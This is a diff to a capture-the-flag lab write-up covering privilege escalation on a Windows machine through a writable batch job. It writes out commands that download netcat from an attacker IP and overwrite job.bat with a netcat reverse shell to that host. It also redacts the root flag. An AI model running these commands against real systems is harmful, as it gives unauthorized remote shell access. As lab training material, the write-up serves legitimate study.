@@ -83,13 +83,13 @@ job.bat BUILTIN\Users:(F)
 The idea is to replace the current code with a reverse shell, which will then be executed by an administrator (similar to cron jobs on unix). But therefore, we first must upload the nc.exe so that we can establish a reverse shell.
 
 ```
-curl http://10.10.14.15/nc.exe -o c:\users\daniel\nc.exe
+curl http://10.10.14.15/nc64.exe -o C:\Log-Management\nc64.exe
 
-echo C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.15 4444 > C:\Log-Management\job.bat
+echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.15 4444 > C:\Log-Management\job.bat
 ```
 
 Now we wait and eventually receive a root-shell:
 
 ![](pics/rootshell.png)
 
-Final step is to obtain the root flag: `f574a3e7650cebd8c39784299cb570f8`
+Final step is to obtain the root flag: `f57[redacted]0f8`
